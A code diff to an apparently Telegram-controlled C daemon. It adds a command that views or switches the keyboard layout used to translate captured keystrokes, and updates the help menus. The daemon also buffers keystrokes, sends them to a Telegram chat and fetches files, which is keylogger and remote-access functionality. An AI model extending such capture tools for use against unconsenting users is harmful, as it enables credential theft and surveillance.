@@ -336,6 +336,53 @@ static void handle_command(const char *text, const char *chat_id, [[maybe_unused
             keyboard_get_status_info(stat_msg, sizeof(stat_msg));
             telegram_send_html(stat_msg);
         }
+    } else if (match_command(text, "keyboard_layout") || match_command(text, "keyboard_layouts") ||
+               match_command(text, "layout") || match_command(text, "layouts")) {
+        if (config->disable_keyboard) {
+            telegram_send_html("⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is disabled in daemon configuration (--no-keyboard).</i>");
+        } else {
+            const char *arg = get_command_argument(text);
+            if (!arg || !*arg) {
+                char cur_layout[128] = "Unknown";
+                keyboard_get_layout(cur_layout, sizeof(cur_layout));
+                char avail_layouts[1024];
+                keyboard_get_available_layouts(avail_layouts, sizeof(avail_layouts));
+                char resp[1500];
+                snprintf(resp, sizeof(resp),
+                         "⌨️ <b>Active Layout:</b> %s\n\n"
+                         "%s\n"
+                         "💡 <b>To switch:</b> <code>/keyboard_layout &lt;code&gt;</code> (e.g. <code>/keyboard_layout it</code>)",
+                         cur_layout, avail_layouts);
+                telegram_send_html(resp);
+            } else {
+                char code_buf[32];
+                size_t clen = 0;
+                while (arg[clen] && !isspace((unsigned char)arg[clen]) && clen + 1 < sizeof(code_buf)) {
+                    code_buf[clen] = arg[clen];
+                    clen++;
+                }
+                code_buf[clen] = '\0';
+
+                if (keyboard_set_layout(code_buf)) {
+                    char new_layout[128] = "Unknown";
+                    keyboard_get_layout(new_layout, sizeof(new_layout));
+                    char resp[512];
+                    snprintf(resp, sizeof(resp),
+                             "🌐 <b>Keyboard Layout Updated:</b> %s\n"
+                             "<i>Keystrokes will now be translated using the selected layout.</i>",
+                             new_layout);
+                    telegram_send_html(resp);
+                } else {
+                    char avail_layouts[1024];
+                    keyboard_get_available_layouts(avail_layouts, sizeof(avail_layouts));
+                    char resp[1200];
+                    snprintf(resp, sizeof(resp),
+                             "⚠️ <b>Invalid Layout Code:</b> <code>%s</code>\n\n%s",
+                             code_buf, avail_layouts);
+                    telegram_send_html(resp);
+                }
+            }
+        }
     } else if (match_command(text, "keyboard_help")) {
         if (config->disable_keyboard) {
             telegram_send_html("⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is disabled in daemon configuration (--no-keyboard).</i>");
@@ -345,13 +392,14 @@ static void handle_command(const char *text, const char *chat_id, [[maybe_unused
                      "⌨️ <b>Keyboard Control Commands</b>\n\n"
                      "• <code>/keyboard_list</code> - View detected keyboard devices &amp; status\n"
                      "• <code>/keyboard_select &lt;id|all&gt;</code> - Filter capture to a specific keyboard\n"
+                     "• <code>/keyboard_layout [code]</code> - View or change keyboard layout\n"
                      "• <code>/keyboard_on</code> - Enable keyboard capturing\n"
                      "• <code>/keyboard_off</code> - Pause keyboard capturing\n"
                      "• <code>/keyboard_toggle</code> - Toggle active / paused state\n"
                      "• <code>/keyboard_mode &lt;code|raw&gt;</code> - Change output formatting\n"
                      "• <code>/keyboard_flush</code> - Flush buffered keys to Telegram immediately\n"
                      "• <code>/keyboard_status</code> - View keyboard monitor state &amp; buffer status\n\n"
-                     "💡 <i>Tip: Commands also accept dash syntax (e.g. <code>/keyboard-list</code>)</i>");
+                     "💡 <i>Tip: Commands also accept dash syntax (e.g. <code>/keyboard-layout it</code>)</i>");
             telegram_send_html(kb_help);
         }
     } else if (match_command(text, "getfile") || match_command(text, "file") ||
@@ -492,6 +540,7 @@ static void handle_command(const char *text, const char *chat_id, [[maybe_unused
             static const char kb_sec[] = "<b>Keyboard Controls:</b>\n"
                                          "• <code>/keyboard_list</code> - View detected keyboard devices\n"
                                          "• <code>/keyboard_select &lt;id|all&gt;</code> - Select active keyboard target\n"
+                                         "• <code>/keyboard_layout [code]</code> - View or change keyboard layout\n"
                                          "• <code>/keyboard_on</code> / <code>/keyboard_off</code> - Enable / mute keyboard\n"
                                          "• <code>/keyboard_mode &lt;code|raw&gt;</code> - Set code block or raw mode\n"
                                          "• <code>/keyboard_status</code> - View detailed keyboard monitor state\n"
